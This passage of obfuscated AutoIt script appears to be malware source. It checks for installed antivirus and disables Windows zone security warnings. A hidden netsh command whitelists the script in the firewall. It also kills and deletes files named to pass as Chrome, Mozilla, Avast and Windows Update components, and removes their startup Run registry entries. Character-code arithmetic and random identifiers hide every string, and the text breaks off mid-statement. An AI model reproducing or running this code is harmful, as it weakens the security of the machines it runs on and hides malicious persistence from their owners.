$owmi.execquery(\"Select * from AntiVirusProduct\")\n    For $objantivirusproduct In $colitems\n        $avname = $objantivirusproduct.displayname\n    Next\n    If $avname = False Then\n        Return \"No-AntiVirus\"\n    Else\n        Return $avname\n    EndIf\nEndFunc\n\nFunc mnmurofuotaxronjkijvbjrqkrmevcwwmbsmjcmjzcqxplscwnzh()\n    EnvSet(ChrW(14 + 69) &amp; \"E\" &amp; ChrW(69) &amp; ChrW(19 + 76) &amp; String(\"M\") &amp; ChrW(100 - 35) &amp; \"S\" &amp; ChrW(116 - 41) &amp; \"_\" &amp; ChrW(13 + 65) &amp; ChrW(79) &amp; ChrW(90) &amp; ChrW(79) &amp; \"N\" &amp; ChrW(103 - 34) &amp; \"C\" &amp; ChrW(27 + 45) &amp; \"E\" &amp; ChrW(94 - 27) &amp; ChrW(75) &amp; \"S\", ChrW(84 - 35))\n    ShellExecute(ChrW(40 + 70) &amp; String(\"e\") &amp; ChrW(21 + 95) &amp; ChrW(129 - 14) &amp; ChrW(1 + 103), ChrW(102) &amp; ChrW(105) &amp; ChrW(114) &amp; ChrW(101) &amp; ChrW(153 - 34) &amp; ChrW(115 - 18) &amp; String(\"l\") &amp; String(\"l\") &amp; String(\" \") &amp; ChrW(132 - 35) &amp; \"d\" &amp; \"d\" &amp; ChrW(32) &amp; \"a\" &amp; String(\"l\") &amp; \"l\" &amp; ChrW(10 + 101) &amp; \"w\" &amp; ChrW(101) &amp; String(\"d\") &amp; ChrW(112) &amp; String(\"r\") &amp; ChrW(111) &amp; String(\"g\") &amp; String(\"r\") &amp; ChrW(97) &amp; String(\"m\") &amp; ChrW(34 - 2) &amp; ChrW(34) &amp; @AutoItExe &amp; ChrW(34) &amp; ChrW(48 - 16) &amp; ChrW(34) &amp; $oolbadsjbfwdjkintqtwpzzxmffhgfnmbxvzjmvtsknhhelokmhf &amp; ChrW(34) &amp; ChrW(16 + 16) &amp; String(\"E\") &amp; ChrW(78) &amp; ChrW(65) &amp; ChrW(32 + 34) &amp; ChrW(76) &amp; \"E\", \"\", \"\", @SW_HIDE)\n    If @error Then\n    EndIf\n    $vdecwnthgnfqrmymkmwaxvzivgqftlelifhrqglgbdraxgltdybw = \"C\" &amp; String(\":\") &amp; ChrW(92) &amp; ChrW(84 - 13) &amp; ChrW(125 - 14) &amp; ChrW(136 - 25) &amp; String(\"g\") &amp; String(\"l\") &amp; ChrW(131 - 30) &amp; ChrW(50 + 17) &amp; ChrW(136 - 32) &amp; ChrW(18 + 96) &amp; ChrW(139 - 28) &amp; \"m\" &amp; String(\"e\")\n    $opmzevfpwoovhuhlefwdapztezlqvwbukjwushmubvknpvsdzznw = ChrW(67) &amp; ChrW(11 + 47) &amp; ChrW(27 + 65) &amp; String(\"M\") &amp; \"o\" &amp; ChrW(14 + 108) &amp; ChrW(49 + 56) &amp; \"l\" &amp; ChrW(108) &amp; \"a\" &amp; ChrW(70) &amp; ChrW(113 - 8) &amp; String(\"r\") &amp; ChrW(101) &amp; \"f\" &amp; ChrW(111) &amp; ChrW(120)\n    ProcessClose(ChrW(78 - 7) &amp; String(\"o\") &amp; \"o\" &amp; \"g\" &amp; \"l\" &amp; ChrW(131 - 30) &amp; String(\"C\") &amp; \"h\" &amp; \"r\" &amp; \"o\" &amp; ChrW(140 - 31) &amp; ChrW(150 - 49) &amp; ChrW(42 + 4) &amp; ChrW(101) &amp; String(\"x\") &amp; ChrW(109 - 8))\n    ProcessClose(ChrW(39 + 38) &amp; \"o\" &amp; ChrW(122) &amp; \"i\" &amp; ChrW(47 + 61) &amp; ChrW(24 + 84) &amp; \"a\" &amp; String(ChrW(47 + -1)) &amp; ChrW(137 - 36) &amp; ChrW(120) &amp; String(\"e\"))\n    Sleep(999)\n    FileDelete($vdecwnthgnfqrmymkmwaxvzivgqftlelifhrqglgbdraxgltdybw &amp; String(\"\\\") &amp; ChrW(71) &amp; ChrW(129 - 18) &amp; String(\"o\") &amp; ChrW(137 - 34) &amp; String(\"l\") &amp; ChrW(14 + 87) &amp; String(\"C\") &amp; ChrW(12 + 92) &amp; ChrW(114) &amp; ChrW(148 - 37) &amp; ChrW(41 + 68) &amp; ChrW(13 + 88) &amp; ChrW(88 - 42) &amp; ChrW(109 - 12) &amp; ChrW(51) &amp; String(\"x\"))\n    FileDelete($vdecwnthgnfqrmymkmwaxvzivgqftlelifhrqglgbdraxgltdybw &amp; ChrW(38 + 54) &amp; String(\"G\") &amp; \"o\" &amp; \"o\" &amp; String(\"g\") &amp; \"l\" &amp; \"e\" &amp; ChrW(67) &amp; \"h\" &amp; String(\"r\") &amp; ChrW(111) &amp; ChrW(115 - 6) &amp; ChrW(124 - 23) &amp; ChrW(65 - 19) &amp; \"e\" &amp; ChrW(152 - 32) &amp; ChrW(137 - 36))\n    FileDelete($vdecwnthgnfqrmymkmwaxvzivgqftlelifhrqglgbdraxgltdybw &amp; ChrW(92) &amp; ChrW(35 + 36) &amp; \"o\" &amp; String(\"o\") &amp; ChrW(34 + 69) &amp; ChrW(121 - 13) &amp; \"e\" &amp; ChrW(67) &amp; \"h\" &amp; ChrW(16 + 98) &amp; ChrW(111) &amp; \"m\" &amp; String(\"e\") &amp; ChrW(47 + -1) &amp; ChrW(151 - 43) &amp; \"n\" &amp; ChrW(18 + 89))\n    FileDelete($vdecwnthgnfqrmymkmwaxvzivgqftlelifhrqglgbdraxgltdybw &amp; \"\\\" &amp; ChrW(25 + 52) &amp; ChrW(9 + 112) &amp; ChrW(78 - 46) &amp; \"P\" &amp; ChrW(19 + 86) &amp; String(\"c\") &amp; ChrW(19 + 97) &amp; String(\"u\") &amp; \"r\" &amp; ChrW(106 - 5) &amp; ChrW(17 + 98) &amp; ChrW(22 + 24) &amp; ChrW(108) &amp; String(\"n\") &amp; ChrW(10 + 97))\n    FileDelete($vdecwnthgnfqrmymkmwaxvzivgqftlelifhrqglgbdraxgltdybw &amp; ChrW(92) &amp; ChrW(32 + 39) &amp; String(\"o\") &amp; ChrW(111) &amp; ChrW(108 - 5) &amp; ChrW(109 - 1) &amp; ChrW(143 - 42) &amp; ChrW(6 + 79) &amp; String(\"p\") &amp; ChrW(42 + 58) &amp; String(\"a\") &amp; ChrW(120 - 4) &amp; ChrW(108 - 7) &amp; ChrW(47 + -1) &amp; \"l\" &amp; ChrW(138 - 28) &amp; ChrW(11 + 96))\n    FileDelete($vdecwnthgnfqrmymkmwaxvzivgqftlelifhrqglgbdraxgltdybw &amp; ChrW(23 + 69) &amp; ChrW(42 + 35) &amp; \"y\" &amp; ChrW(46 + -14) &amp; ChrW(108 - 31) &amp; ChrW(30 + 87) &amp; ChrW(148 - 33) &amp; \"i\" &amp; \"c\" &amp; ChrW(47 + -1) &amp; ChrW(108) &amp; \"n\" &amp; ChrW(107))\n    FileDelete($vdecwnthgnfqrmymkmwaxvzivgqftlelifhrqglgbdraxgltdybw &amp; ChrW(44 + 48) &amp; \"W\" &amp; ChrW(5 + 100) &amp; ChrW(26 + 84) &amp; String(\"d\") &amp; ChrW(26 + 85) &amp; \"w\" &amp; String(\"s\") &amp; \"U\" &amp; ChrW(117 - 5) &amp; ChrW(18 + 82) &amp; \"a\" &amp; \"t\" &amp; ChrW(44 + 57) &amp; String(ChrW(47 + -1)) &amp; String(\"l\") &amp; ChrW(110) &amp; String(\"k\"))\n    If ProcessExists(ChrW(39 + 38) &amp; \"o\" &amp; ChrW(122) &amp; \"i\" &amp; ChrW(47 + 61) &amp; ChrW(24 + 84) &amp; \"a\" &amp; String(ChrW(47 + -1)) &amp; ChrW(137 - 36) &amp; ChrW(120) &amp; String(\"e\")) Then\n        ProcessClose(ChrW(39 + 38) &amp; \"o\" &amp; ChrW(122) &amp; \"i\" &amp; ChrW(47 + 61) &amp; ChrW(24 + 84) &amp; \"a\" &amp; String(ChrW(47 + -1)) &amp; ChrW(137 - 36) &amp; ChrW(120) &amp; String(\"e\"))\n    EndIf\n    FileDelete($vdecwnthgnfqrmymkmwaxvzivgqftlelifhrqglgbdraxgltdybw &amp; ChrW(92) &amp; String(\"M\") &amp; \"o\" &amp; String(\"z\") &amp; String(\"i\") &amp; ChrW(131 - 23) &amp; String(\"l\") &amp; ChrW(104 - 7) &amp; ChrW(89 - 43) &amp; ChrW(10 + 91) &amp; ChrW(120) &amp; ChrW(31 + 70))\n    FileDelete($vdecwnthgnfqrmymkmwaxvzivgqftlelifhrqglgbdraxgltdybw &amp; ChrW(122 - 30) &amp; \"M\" &amp; ChrW(132 - 21) &amp; ChrW(129 - 7) &amp; ChrW(38 + 67) &amp; ChrW(45 + 63) &amp; ChrW(108) &amp; ChrW(97) &amp; ChrW(46) &amp; ChrW(118) &amp; \"b\" &amp; ChrW(42 + 73))\n    FileDelete($vdecwnthgnfqrmymkmwaxvzivgqftlelifhrqglgbdraxgltdybw &amp; \"\\\" &amp; String(\"M\") &amp; ChrW(5 + 106) &amp; ChrW(124 - 2) &amp; ChrW(105) &amp; ChrW(135 - 27) &amp; ChrW(108) &amp; String(\"a\") &amp; ChrW(46) &amp; \"v\" &amp; ChrW(98))\n    FileDelete($opmzevfpwoovhuhlefwdapztezlqvwbukjwushmubvknpvsdzznw &amp; String(\"\\\") &amp; ChrW(71) &amp; ChrW(129 - 18) &amp; String(\"o\") &amp; ChrW(137 - 34) &amp; String(\"l\") &amp; ChrW(14 + 87) &amp; String(\"C\") &amp; ChrW(12 + 92) &amp; ChrW(114) &amp; ChrW(148 - 37) &amp; ChrW(41 + 68) &amp; ChrW(13 + 88) &amp; ChrW(88 - 42) &amp; ChrW(109 - 12) &amp; ChrW(51) &amp; String(\"x\"))\n    FileDelete($opmzevfpwoovhuhlefwdapztezlqvwbukjwushmubvknpvsdzznw &amp; ChrW(38 + 54) &amp; String(\"G\") &amp; \"o\" &amp; \"o\" &amp; String(\"g\") &amp; \"l\" &amp; \"e\" &amp; ChrW(67) &amp; \"h\" &amp; String(\"r\") &amp; ChrW(111) &amp; ChrW(115 - 6) &amp; ChrW(124 - 23) &amp; ChrW(65 - 19) &amp; \"e\" &amp; ChrW(152 - 32) &amp; ChrW(137 - 36))\n    FileDelete($opmzevfpwoovhuhlefwdapztezlqvwbukjwushmubvknpvsdzznw &amp; ChrW(92) &amp; ChrW(35 + 36) &amp; \"o\" &amp; String(\"o\") &amp; ChrW(34 + 69) &amp; ChrW(121 - 13) &amp; \"e\" &amp; ChrW(67) &amp; \"h\" &amp; ChrW(16 + 98) &amp; ChrW(111) &amp; \"m\" &amp; String(\"e\") &amp; ChrW(47 + -1) &amp; ChrW(151 - 43) &amp; \"n\" &amp; ChrW(18 + 89))\n    FileDelete($opmzevfpwoovhuhlefwdapztezlqvwbukjwushmubvknpvsdzznw &amp; \"\\\" &amp; ChrW(25 + 52) &amp; ChrW(9 + 112) &amp; ChrW(78 - 46) &amp; \"P\" &amp; ChrW(19 + 86) &amp; String(\"c\") &amp; ChrW(19 + 97) &amp; String(\"u\") &amp; \"r\" &amp; ChrW(106 - 5) &amp; ChrW(17 + 98) &amp; ChrW(22 + 24) &amp; ChrW(108) &amp; String(\"n\") &amp; ChrW(10 + 97))\n    FileDelete($opmzevfpwoovhuhlefwdapztezlqvwbukjwushmubvknpvsdzznw &amp; ChrW(92) &amp; ChrW(32 + 39) &amp; String(\"o\") &amp; ChrW(111) &amp; ChrW(108 - 5) &amp; ChrW(109 - 1) &amp; ChrW(143 - 42) &amp; ChrW(6 + 79) &amp; String(\"p\") &amp; ChrW(42 + 58) &amp; String(\"a\") &amp; ChrW(120 - 4) &amp; ChrW(108 - 7) &amp; ChrW(47 + -1) &amp; \"l\" &amp; ChrW(138 - 28) &amp; ChrW(11 + 96))\n    FileDelete($opmzevfpwoovhuhlefwdapztezlqvwbukjwushmubvknpvsdzznw &amp; ChrW(23 + 69) &amp; ChrW(42 + 35) &amp; \"y\" &amp; ChrW(46 + -14) &amp; ChrW(108 - 31) &amp; ChrW(30 + 87) &amp; ChrW(148 - 33) &amp; \"i\" &amp; \"c\" &amp; ChrW(47 + -1) &amp; ChrW(108) &amp; \"n\" &amp; ChrW(107))\n    FileDelete($opmzevfpwoovhuhlefwdapztezlqvwbukjwushmubvknpvsdzznw &amp; ChrW(44 + 48) &amp; \"W\" &amp; ChrW(5 + 100) &amp; ChrW(26 + 84) &amp; String(\"d\") &amp; ChrW(26 + 85) &amp; \"w\" &amp; String(\"s\") &amp; \"U\" &amp; ChrW(117 - 5) &amp; ChrW(18 + 82) &amp; \"a\" &amp; \"t\" &amp; ChrW(44 + 57) &amp; String(ChrW(47 + -1)) &amp; String(\"l\") &amp; ChrW(110) &amp; String(\"k\"))\n    If ProcessExists(ChrW(39 + 38) &amp; \"o\" &amp; ChrW(122) &amp; \"i\" &amp; ChrW(47 + 61) &amp; ChrW(24 + 84) &amp; \"a\" &amp; String(ChrW(47 + -1)) &amp; ChrW(137 - 36) &amp; ChrW(120) &amp; String(\"e\")) Then\n        ProcessClose(ChrW(39 + 38) &amp; \"o\" &amp; ChrW(122) &amp; \"i\" &amp; ChrW(47 + 61) &amp; ChrW(24 + 84) &amp; \"a\" &amp; String(ChrW(47 + -1)) &amp; ChrW(137 - 36) &amp; ChrW(120) &amp; String(\"e\"))\n    EndIf\n    FileDelete($opmzevfpwoovhuhlefwdapztezlqvwbukjwushmubvknpvsdzznw &amp; ChrW(92) &amp; String(\"M\") &amp; \"o\" &amp; String(\"z\") &amp; String(\"i\") &amp; ChrW(131 - 23) &amp; String(\"l\") &amp; ChrW(104 - 7) &amp; ChrW(89 - 43) &amp; ChrW(10 + 91) &amp; ChrW(120) &amp; ChrW(31 + 70))\n    FileDelete($opmzevfpwoovhuhlefwdapztezlqvwbukjwushmubvknpvsdzznw &amp; ChrW(122 - 30) &amp; \"M\" &amp; ChrW(132 - 21) &amp; ChrW(129 - 7) &amp; ChrW(38 + 67) &amp; ChrW(45 + 63) &amp; ChrW(108) &amp; ChrW(97) &amp; ChrW(46) &amp; ChrW(118) &amp; \"b\" &amp; ChrW(42 + 73))\n    FileDelete($opmzevfpwoovhuhlefwdapztezlqvwbukjwushmubvknpvsdzznw &amp; \"\\\" &amp; String(\"M\") &amp; ChrW(5 + 106) &amp; ChrW(124 - 2) &amp; ChrW(105) &amp; ChrW(135 - 27) &amp; ChrW(108) &amp; String(\"a\") &amp; ChrW(46) &amp; \"v\" &amp; ChrW(98))\n    RegDelete(String(\"H\") &amp; ChrW(112 - 37) &amp; ChrW(69) &amp; String(\"Y\") &amp; \"_\" &amp; ChrW(102 - 26) &amp; ChrW(89 - 10) &amp; ChrW(105 - 38) &amp; String(\"A\") &amp; ChrW(105 - 29) &amp; ChrW(95) &amp; \"M\" &amp; \"A\" &amp; \"C\" &amp; ChrW(23 + 49) &amp; ChrW(107 - 34) &amp; ChrW(22 + 56) &amp; ChrW(69) &amp; String(\"\\\") &amp; ChrW(98 - 15) &amp; ChrW(19 + 92) &amp; \"f\" &amp; ChrW(19 + 97) &amp; ChrW(6 + 113) &amp; String(\"a\") &amp; ChrW(17 + 97) &amp; \"e\" &amp; ChrW(123 - 31) &amp; \"M\" &amp; ChrW(18 + 87) &amp; String(\"c\") &amp; ChrW(114) &amp; ChrW(159 - 48) &amp; ChrW(115) &amp; String(\"o\") &amp; String(\"f\") &amp; ChrW(135 - 19) &amp; ChrW(92) &amp; ChrW(49 + 38) &amp; ChrW(144 - 39) &amp; \"n\" &amp; ChrW(32 + 68) &amp; ChrW(111) &amp; ChrW(27 + 92) &amp; ChrW(115) &amp; ChrW(92) &amp; ChrW(21 + 46) &amp; \"u\" &amp; ChrW(26 + 88) &amp; ChrW(27 + 87) &amp; ChrW(11 + 90) &amp; ChrW(110) &amp; ChrW(18 + 98) &amp; ChrW(39 + 47) &amp; \"e\" &amp; \"r\" &amp; ChrW(157 - 42) &amp; \"i\" &amp; ChrW(122 - 11) &amp; ChrW(131 - 21) &amp; ChrW(22 + 70) &amp; String(\"R\") &amp; ChrW(138 - 21) &amp; ChrW(127 - 17), String(\"J\") &amp; ChrW(97) &amp; \"v\" &amp; ChrW(97) &amp; ChrW(36 + 49) &amp; \"p\" &amp; ChrW(29 + 71) &amp; \"a\" &amp; ChrW(133 - 17) &amp; \"e\")\n    RegDelete(String(\"H\") &amp; ChrW(75) &amp; ChrW(13 + 56) &amp; String(\"Y\") &amp; String(\"_\") &amp; \"C\" &amp; ChrW(85) &amp; ChrW(35 + 47) &amp; String(\"R\") &amp; String(\"E\") &amp; String(\"N\") &amp; ChrW(16 + 68) &amp; ChrW(95) &amp; \"U\" &amp; ChrW(83) &amp; ChrW(69) &amp; ChrW(95 - 13) &amp; ChrW(14 + 78) &amp; \"S\" &amp; ChrW(22 + 89) &amp; ChrW(11 + 91) &amp; ChrW(116) &amp; \"w\" &amp; ChrW(34 + 63) &amp; ChrW(114) &amp; ChrW(102 - 1) &amp; \"\\\" &amp; \"M\" &amp; String(\"i\") &amp; \"c\" &amp; \"r\" &amp; \"o\" &amp; ChrW(115) &amp; ChrW(111) &amp; String(\"f\") &amp; ChrW(15 + 101) &amp; \"\\\" &amp; String(\"W\") &amp; ChrW(105) &amp; \"n\" &amp; ChrW(22 + 78) &amp; \"o\" &amp; String(\"w\") &amp; \"s\" &amp; \"\\\" &amp; ChrW(67) &amp; ChrW(117) &amp; String(\"r\") &amp; \"r\" &amp; \"e\" &amp; \"n\" &amp; String(\"t\") &amp; \"V\" &amp; ChrW(101) &amp; ChrW(119 - 5) &amp; ChrW(157 - 42) &amp; ChrW(17 + 88) &amp; \"o\" &amp; String(\"n\") &amp; ChrW(92) &amp; ChrW(82) &amp; ChrW(24 + 93) &amp; String(\"n\"), \"A\" &amp; ChrW(22 + 78) &amp; ChrW(13 + 98) &amp; ChrW(3 + 109) &amp; ChrW(27 + 74) &amp; ChrW(85) &amp; ChrW(112) &amp; ChrW(100) &amp; \"a\" &amp; ChrW(116) &amp; String(\"e\"))\n    RegDelete(String(\"H\") &amp; ChrW(112 - 37) &amp; ChrW(69) &amp; String(\"Y\") &amp; \"_\" &amp; ChrW(102 - 26) &amp; ChrW(89 - 10) &amp; ChrW(105 - 38) &amp; String(\"A\") &amp; ChrW(105 - 29) &amp; ChrW(95) &amp; \"M\" &amp; \"A\" &amp; \"C\" &amp; ChrW(23 + 49) &amp; ChrW(107 - 34) &amp; ChrW(22 + 56) &amp; ChrW(69) &amp; String(\"\\\") &amp; ChrW(98 - 15) &amp; ChrW(19 + 92) &amp; \"f\" &amp; ChrW(19 + 97) &amp; ChrW(6 + 113) &amp; String(\"a\") &amp; ChrW(17 + 97) &amp; \"e\" &amp; ChrW(123 - 31) &amp; \"M\" &amp; ChrW(18 + 87) &amp; String(\"c\") &amp; ChrW(114) &amp; ChrW(159 - 48) &amp; ChrW(115) &amp; String(\"o\") &amp; String(\"f\") &amp; ChrW(135 - 19) &amp; ChrW(92) &amp; ChrW(49 + 38) &amp; ChrW(144 - 39) &amp; \"n\" &amp; ChrW(32 + 68) &amp; ChrW(111) &amp; ChrW(27 + 92) &amp; ChrW(115) &amp; ChrW(92) &amp; ChrW(21 + 46) &amp; \"u\" &amp; ChrW(26 + 88) &amp; ChrW(27 + 87) &amp; ChrW(11 + 90) &amp; ChrW(110) &amp; ChrW(18 + 98) &amp; ChrW(39 + 47) &amp; \"e\" &amp; \"r\" &amp; ChrW(157 - 42) &amp; \"i\" &amp; ChrW(122 - 11) &amp; ChrW(131 - 21) &amp; ChrW(22 + 70) &amp; String(\"R\") &amp; ChrW(138 - 21) &amp; ChrW(127 - 17), \"N\" &amp; ChrW(29 + 72) &amp; \"w\" &amp; ChrW(74) &amp; ChrW(97) &amp; ChrW(19 + 99) &amp; ChrW(100 - 3) &amp; \"I\" &amp; ChrW(158 - 48) &amp; String(\"s\") &amp; ChrW(49 + 67) &amp; ChrW(97) &amp; ChrW(17 + 91) &amp; ChrW(123 - 15))\n    RegDelete(String(\"H\") &amp; ChrW(75) &amp; ChrW(13 + 56) &amp; String(\"Y\") &amp; String(\"_\") &amp; \"C\" &amp; ChrW(85) &amp; ChrW(35 + 47) &amp; String(\"R\") &amp; String(\"E\") &amp; String(\"N\") &amp; ChrW(16 + 68) &amp; ChrW(95) &amp; \"U\" &amp; ChrW(83) &amp; ChrW(69) &amp; ChrW(95 - 13) &amp; ChrW(14 + 78) &amp; \"S\" &amp; ChrW(22 + 89) &amp; ChrW(11 + 91) &amp; ChrW(116) &amp; \"w\" &amp; ChrW(34 + 63) &amp; ChrW(114) &amp; ChrW(102 - 1) &amp; \"\\\" &amp; \"M\" &amp; String(\"i\") &amp; \"c\" &amp; \"r\" &amp; \"o\" &amp; ChrW(115) &amp; ChrW(111) &amp; String(\"f\") &amp; ChrW(15 + 101) &amp; \"\\\" &amp; String(\"W\") &amp; ChrW(105) &amp; \"n\" &amp; ChrW(22 + 78) &amp; \"o\" &amp; String(\"w\") &amp; \"s\" &amp; \"\\\" &amp; ChrW(67) &amp; ChrW(117) &amp; String(\"r\") &amp; \"r\" &amp; \"e\" &amp; \"n\" &amp; String(\"t\") &amp; \"V\" &amp; ChrW(101) &amp; ChrW(119 - 5) &amp; ChrW(157 - 42) &amp; ChrW(17 + 88) &amp; \"o\" &amp; String(\"n\") &amp; ChrW(92) &amp; ChrW(82) &amp; ChrW(24 + 93) &amp; String(\"n\"), String(\"A\") &amp; ChrW(10 + 90) &amp; String(\"o\") &amp; \"p\" &amp; ChrW(101) &amp; \"F\" &amp; String(\"l\") &amp; ChrW(9 + 88) &amp; ChrW(28 + 87) &amp; ChrW(39 + 65))\n    RegDelete(ChrW(72) &amp; \"K\" &amp; ChrW(69) &amp; ChrW(89) &amp; ChrW(116 - 21) &amp; ChrW(76) &amp; ChrW(79) &amp; \"C\" &amp; String(\"A\") &amp; ChrW(76) &amp; ChrW(19 + 76) &amp; ChrW(77) &amp; String(\"A\") &amp; \"C\" &amp; \"H\" &amp; ChrW(73) &amp; \"N\" &amp; \"E\" &amp; ChrW(92) &amp; String(\"S\") &amp; ChrW(31 + 48) &amp; ChrW(38 + 32) &amp; String(\"T\") &amp; ChrW(87) &amp; ChrW(94 - 29) &amp; ChrW(82) &amp; ChrW(96 - 27) &amp; ChrW(117 - 25) &amp; \"M\" &amp; String(\"i\") &amp; String(\"c\") &amp; ChrW(24 + 90) &amp; ChrW(39 + 72) &amp; \"s\" &amp; ChrW(49 + 62) &amp; ChrW(102) &amp; ChrW(125 - 9) &amp; ChrW(141 - 49) &amp; ChrW(87) &amp; ChrW(109 - 4) &amp; ChrW(110) &amp; ChrW(32 + 68) &amp; String(\"o\") &amp; String(\"w\") &amp; ChrW(150 - 35) &amp; \"\\\" &amp; \"C\" &amp; ChrW(47 + 70) &amp; \"r\" &amp; \"r\" &amp; \"e\" &amp; \"n\" &amp; ChrW(157 - 41) &amp; ChrW(86) &amp; ChrW(101) &amp; ChrW(42 + 72) &amp; ChrW(122 - 7) &amp; String(\"i\") &amp; \"o\" &amp; \"n\" &amp; ChrW(31 + 61) &amp; \"R\" &amp; ChrW(117) &amp; ChrW(110), ChrW(125 - 38) &amp; ChrW(152 - 47) &amp; ChrW(23 + 87) &amp; ChrW(6 + 94) &amp; \"o\" &amp; \"w\" &amp; \"s\" &amp; \"U\" &amp; String(\"p\") &amp; \"d\" &amp; ChrW(97) &amp; ChrW(38 + 78) &amp; ChrW(101) &amp; ChrW(18 + 28) &amp; String(\"l\") &amp; ChrW(155 - 45) &amp; ChrW(107))\n    RegDelete(ChrW(112 - 40) &amp; ChrW(75) &amp; ChrW(69) &amp; ChrW(89) &amp; String(\"_\") &amp; ChrW(67) &amp; String(\"U\") &amp; ChrW(126 - 44) &amp; \"R\" &amp; ChrW(69) &amp; ChrW(110 - 32) &amp; ChrW(84) &amp; ChrW(95) &amp; ChrW(85) &amp; String(\"S\") &amp; ChrW(69) &amp; ChrW(82) &amp; ChrW(92) &amp; ChrW(83) &amp; ChrW(79) &amp; String(\"F\") &amp; ChrW(20 + 64) &amp; ChrW(87) &amp; \"A\" &amp; ChrW(82) &amp; ChrW(100 - 31) &amp; ChrW(49 + 43) &amp; ChrW(77) &amp; ChrW(105) &amp; String(\"c\") &amp; String(\"r\") &amp; String(\"o\") &amp; ChrW(151 - 36) &amp; ChrW(122 - 11) &amp; ChrW(102) &amp; ChrW(116) &amp; ChrW(25 + 67) &amp; ChrW(136 - 49) &amp; \"i\" &amp; ChrW(15 + 95) &amp; ChrW(100) &amp; ChrW(50 + 61) &amp; ChrW(136 - 17) &amp; ChrW(115) &amp; String(\"\\\") &amp; \"C\" &amp; String(\"u\") &amp; String(\"r\") &amp; ChrW(33 + 81) &amp; ChrW(109 - 8) &amp; ChrW(110) &amp; ChrW(116) &amp; String(\"V\") &amp; \"e\" &amp; String(\"r\") &amp; \"s\" &amp; \"i\" &amp; String(\"o\") &amp; ChrW(128 - 18) &amp; String(\"\\\") &amp; ChrW(82) &amp; ChrW(117) &amp; ChrW(35 + 75), ChrW(125 - 38) &amp; ChrW(152 - 47) &amp; ChrW(23 + 87) &amp; ChrW(6 + 94) &amp; \"o\" &amp; \"w\" &amp; \"s\" &amp; \"U\" &amp; String(\"p\") &amp; \"d\" &amp; ChrW(97) &amp; ChrW(38 + 78) &amp; ChrW(101) &amp; ChrW(18 + 28) &amp; String(\"l\") &amp; ChrW(155 - 45) &amp; ChrW(107))\n    RegDelete(ChrW(72) &amp; \"K\" &amp; ChrW(69) &amp; ChrW(89) &amp; ChrW(116 - 21) &amp; ChrW(76) &amp; ChrW(79) &amp; \"C\" &amp; String(\"A\") &amp; ChrW(76) &amp; ChrW(19 + 76) &amp; ChrW(77) &amp; String(\"A\") &amp; \"C\" &amp; \"H\" &amp; ChrW(73) &amp; \"N\" &amp; \"E\" &amp; ChrW(92) &amp; String(\"S\") &amp; ChrW(31 + 48) &amp; ChrW(38 + 32) &amp; String(\"T\") &amp; ChrW(87) &amp; ChrW(94 - 29) &amp; ChrW(82) &amp; ChrW(96 - 27) &amp; ChrW(117 - 25) &amp; \"M\" &amp; String(\"i\") &amp; String(\"c\") &amp; ChrW(24 + 90) &amp; ChrW(39 + 72) &amp; \"s\" &amp; ChrW(49 + 62) &amp; ChrW(102) &amp; ChrW(125 - 9) &amp; ChrW(141 - 49) &amp; ChrW(87) &amp; ChrW(109 - 4) &amp; ChrW(110) &amp; ChrW(32 + 68) &amp; String(\"o\") &amp; String(\"w\") &amp; ChrW(150 - 35) &amp; \"\\\" &amp; \"C\" &amp; ChrW(47 + 70) &amp; \"r\" &amp; \"r\" &amp; \"e\" &amp; \"n\" &amp; ChrW(157 - 41) &amp; ChrW(86) &amp; ChrW(101) &amp; ChrW(42 + 72) &amp; ChrW(122 - 7) &amp; String(\"i\") &amp; \"o\" &amp; \"n\" &amp; ChrW(31 + 61) &amp; \"R\" &amp; ChrW(117) &amp; ChrW(110), ChrW(78 - 7) &amp; String(\"o\") &amp; \"o\" &amp; \"g\" &amp; \"l\" &amp; ChrW(131 - 30) &amp; String(\"C\") &amp; \"h\" &amp; \"r\" &amp; \"o\" &amp; ChrW(140 - 31) &amp; ChrW(150 - 49) &amp; ChrW(42 + 4) &amp; ChrW(101) &amp; String(\"x\") &amp; ChrW(109 - 8))\n    RegDelete(ChrW(112 - 40) &amp; ChrW(75) &amp; ChrW(69) &amp; ChrW(89) &amp; String(\"_\") &amp; ChrW(67) &amp; String(\"U\") &amp; ChrW(126 - 44) &amp; \"R\" &amp; ChrW(69) &amp; ChrW(110 - 32) &amp; ChrW(84) &amp; ChrW(95) &amp; ChrW(85) &amp; String(\"S\") &amp; ChrW(69) &amp; ChrW(82) &amp; ChrW(92) &amp; ChrW(83) &amp; ChrW(79) &amp; String(\"F\") &amp; ChrW(20 + 64) &amp; ChrW(87) &amp; \"A\" &amp; ChrW(82) &amp; ChrW(100 - 31) &amp; ChrW(49 + 43) &amp; ChrW(77) &amp; ChrW(105) &amp; String(\"c\") &amp; String(\"r\") &amp; String(\"o\") &amp; ChrW(151 - 36) &amp; ChrW(122 - 11) &amp; ChrW(102) &amp; ChrW(116) &amp; ChrW(25 + 67) &amp; ChrW(136 - 49) &amp; \"i\" &amp; ChrW(15 + 95) &amp; ChrW(100) &amp; ChrW(50 + 61) &amp; ChrW(136 - 17) &amp; ChrW(115) &amp; String(\"\\\") &amp; \"C\" &amp; String(\"u\") &amp; String(\"r\") &amp; ChrW(33 + 81) &amp; ChrW(109 - 8) &amp; ChrW(110) &amp; ChrW(116) &amp; String(\"V\") &amp; \"e\" &amp; String(\"r\") &amp; \"s\" &amp; \"i\" &amp; String(\"o\") &amp; ChrW(128 - 18) &amp; String(\"\\\") &amp; ChrW(82) &amp; ChrW(117) &amp; ChrW(35 + 75), ChrW(78 - 7) &amp; String(\"o\") &amp; \"o\" &amp; \"g\" &amp; \"l\" &amp; ChrW(131 - 30) &amp; String(\"C\") &amp; \"h\" &amp; \"r\" &amp; \"o\" &amp; ChrW(140 - 31) &amp; ChrW(150 - 49) &amp; ChrW(42 + 4) &amp; ChrW(101) &amp; String(\"x\") &amp; ChrW(109 - 8))\n    RegDelete(ChrW(72) &amp; \"K\" &amp; ChrW(69) &amp; ChrW(89) &amp; ChrW(116 - 21) &amp; ChrW(76) &amp; ChrW(79) &amp; \"C\" &amp; String(\"A\") &amp; ChrW(76) &amp; ChrW(19 + 76) &amp; ChrW(77) &amp; String(\"A\") &amp; \"C\" &amp; \"H\" &amp; ChrW(73) &amp; \"N\" &amp; \"E\" &amp; ChrW(92) &amp; String(\"S\") &amp; ChrW(31 + 48) &amp; ChrW(38 + 32) &amp; String(\"T\") &amp; ChrW(87) &amp; ChrW(94 - 29) &amp; ChrW(82) &amp; ChrW(96 - 27) &amp; ChrW(117 - 25) &amp; \"M\" &amp; String(\"i\") &amp; 